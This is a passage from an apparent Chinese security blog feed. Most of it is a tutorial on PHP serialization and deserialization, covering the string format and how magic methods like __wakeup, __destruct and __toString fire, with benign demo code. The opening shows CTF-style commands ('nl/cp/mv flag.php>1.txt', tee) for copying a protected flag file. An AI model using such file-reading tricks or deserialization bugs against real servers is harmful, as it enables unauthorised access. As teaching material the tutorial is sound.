class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nl</span> flag.php&gt;1.txt</span><br><span class="line"><span class="built_in">cp</span> flag.php&gt;1.txt</span><br><span class="line"><span class="built_in">mv</span> flag.php&gt;1.txt</span><br></pre></td></tr></table></figure><p>tee命令</p><ul><li>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</li><li><code>tee file1 file2</code>：复制文件</li><li><code>ls /|tee 1.txt</code>：命令输出</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2023/07/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>序列化其实就是将数据转化成一种可逆的数据结构，逆向的过程就叫做反序列化。</li><li>php 将数据序列化和反序列化会用到两个函数</li></ul><blockquote><p><strong>serialize</strong> 将对象格式化成有序的字符串</p><p><strong>unserialize</strong> 将字符串还原成原来的对象</p></blockquote><ul><li><p>常见的序列化格式</p><ul><li><p>二进制格式</p></li><li><p>字节数组</p></li><li><p>json字符串</p></li><li><p>xml字符串</p></li></ul></li></ul><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TEST</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data2</span> = <span class="string">&quot;dazzhuang&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$number</span> = <span class="number">34</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$null</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">10</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">200</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span>-&gt;data = &amp;<span class="variable">$test2</span>-&gt;data2;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$number</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$bool</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$null</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test2</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i:<span class="number">34</span>;<span class="comment">//int 整型</span></span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;<span class="comment">//字符串型</span></span><br><span class="line">b:<span class="number">1</span>;<span class="comment">//bool</span></span><br><span class="line">N;<span class="comment">//null空</span></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;i:<span class="number">10</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;i:<span class="number">200</span>;&#125;<span class="comment">//array 数组</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;TEST&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;uu&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;data2&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;dazzhuang&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;TESTpass&quot;</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;TEST&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;dazzhuang&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;data2&quot;</span>;R:<span class="number">2</span>;s:<span class="number">10</span>:<span class="string">&quot;TESTpass&quot;</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line"><span class="comment">//Object 对象</span></span><br></pre></td></tr></table></figure><h2 id="表达方式"><a href="#表达方式" class="headerlink" title="表达方式"></a>表达方式</h2><blockquote><p>字符串：s : 内容长度 : “内容”</p><p>数组：a : 参数数量 : {内容1 ; 内容2 ; 内容3……}</p><p>对象：O : 类名长度 : 类名 : 变量数量 : {内容1 ; 内容2 ; 内容3……}<br>内容：变量类型 : 变量名字长度 : “变量名字” ; 值的类型 : 值的长度 : 值;</p><p>%00是url编码后的空格<br><code>private私有属性序列化时，在变量名前加&quot;%00类名%00&quot;</code><br><code>protected受保护属性序列化时在变量名前加&quot;%00*%00&quot;</code></p></blockquote><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><ul><li>反序列化之后的内容为一个对象</li><li>反序列化生成的对象里的值，由反序列化里的值提供，与原有类定义的值无关</li><li>反序列化不触发类的成员方法，需要调用方法后才能触发</li></ul><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="什么是魔术方法"><a href="#什么是魔术方法" class="headerlink" title="什么是魔术方法"></a>什么是魔术方法</h3><ul><li>一个预定义好的，在特定情况下自动触发的行为方法</li></ul><h3 id="魔术方法的作用"><a href="#魔术方法的作用" class="headerlink" title="魔术方法的作用"></a>魔术方法的作用</h3><ul><li>反序列化漏洞的成因<ul><li>反序列化过程中，<code>unserialize()</code>接受的值（字符串）可控</li><li>通过更改这个值（字符串），得到所需要的代码</li><li>通过调用方法，触发代码执行</li></ul></li></ul><blockquote><p>魔术方法在特定条件下自动调用相关方法，最终导致触发代码</p></blockquote><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><blockquote><p><code>_construct()</code>：类的构建函数</p><p><code>_destruct()</code>：类的析构函数</p><p><code>_call()</code>：在对象中调用一个不可以访问方法时调用</p><p><code>_callStatic()</code>：用静态方式中调用一个不可以访问方法时调用</p><p><code>_get()</code>：获得一个类的成员变量时调用</p><p><code>_isset()</code>：当对不可访问属性调用isset()或empty()时调用</p><p><code>_set()</code>：设置一个类的成员变量时调用</p><p><code>_unset()</code>：当对不可访问属性调用unset()时被调用</p><p><code>_sleep()</code>：执行serialize()时，先会调用这个函数</p><p><code>_wakeup()</code>：执行unserialize()时，先会调用这个函数</p><p><code>_toString()</code>：类被当成字符串时的回应方法</p><p><code>_invoke()</code>：调用函数的方式调用一个对象时的回应方法</p><p><code>_set_state()</code>：调用var_export()导出类时，此静态方法被调用</p><p><code>_clone()</code>：当对象复制完成时调用</p><p><code>_autoload()</code>：尝试加载未定义的类</p><p><code>_debugInfo()</code>：打印所需调试信息</p></blockquote><h2 id="函数详解"><a href="#函数详解" class="headerlink" title="函数详解"></a>函数详解</h2><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><ul><li>构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了构造函数1次&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    触发了构造函数<span class="number">1</span>次</span><br></pre></td></tr></table></figure><ul><li>实例化对象时触发构造函数<code>_construct()</code></li></ul><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><ul><li>析构函数，在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了析构函数1次&quot;</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    触发了析构函数<span class="number">1</span>次</span><br><span class="line">    触发了析构函数<span class="number">1</span>次</span><br></pre></td></tr></table></figure><ul><li>实例化对象结束后，代码运行完全销毁，触发析构函数<code>_destruct()</code></li><li>反序列化得到的是对象，用完后会销毁，会触发析构函数<code>_destruct()</code></li></ul><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h3><ul><li>序列化<code>serialize()</code>函数会检查类中是否存在一个魔术方法<code>_sleep()</code><br>如果存在，该方法会先被调用，然后才执行序列化操作</li><li>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组<br>如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误</li></ul><blockquote><p>触发时机：序列化serialize()之前</p><p>功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性</p><p>参数：成员属性</p><p>返回值：需要被序列化存储的成员属性 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>serialize()</code>只序列化sleep返回的变量</li></ul><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><ul><li><code>unserialize()</code>会检查是否存在一个<code>_wakeup()</code>方法<br>如果存在，则会先调用<code>_wakep()</code>方法，预先准备对象需要的资源</li><li>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始操作</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    <span class="keyword">object</span>(User)<span class="comment">#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>_wakeup()在反序列化unserialize()之前</p><p>_destruct()在反序列化unserialize()之后</p></blockquote><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><ul><li>表达方式错误导致魔术方法触发<ul><li>触发时机：把对象当作字符串调用</li></ul></li><li>常用于构造POP链接</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="string">&#x27;格式不对，输出不了!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    User <span class="title function_ invoke__">Object</span> ( [benben] =&gt; this is test!! )</span><br><span class="line">格式不对，输出不了!</span><br></pre></td></tr></table></figure><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><ul><li>格式表达错误导致魔术方法触发<ul><li>触发时机：把对象当成函数调用</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span>  <span class="string">&#x27;它不是个函数!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span> -&gt;benben;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>() -&gt;benben;</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    this is test!!</span><br><span class="line">它不是个函数!</span><br></pre></td></tr></table></figure><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><ul><li>触发时机：调用一个不存在的方法。</li><li>返回值：调用的不存在的方法的名称和参数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt; <span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    callxxx,a</span><br></pre></td></tr></table></figure><h3 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h3><ul><li>触发时机：静态调用或调用成员常量时使用的方法不存在</li><li>返回值：调用的不存在的方法的名称和参数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    callxxx,a</span><br></pre></td></tr></table></figure><h3 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h3><ul><li>触发时机：调用的成员属性不存在</li><li>返回值：不存在的成员属性的名称</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2;</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    var2</span><br></pre></td></tr></table></figure><h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><ul><li>触发时机：给不存在的成员属性赋值</li><li>返回值：不存在的成员属性的名称和赋的值</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span> ,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    var2,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><ul><li>触发时机：对不可访问属性使用<code>isset()</code>或<code>empty()</code>时，<code>_isset()</code>会被调用</li><li>返回值：不存在的成员属性的名称</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"></span><br><span class="line">输出结果；</span><br><span class="line">    <span class="keyword">var</span></span><br></pre></td></tr></table></figure><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><ul><li>触发时机：对不可访问属性使用<code>unset()</code>时</li><li>返回值：不存在的成员属性的名称</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 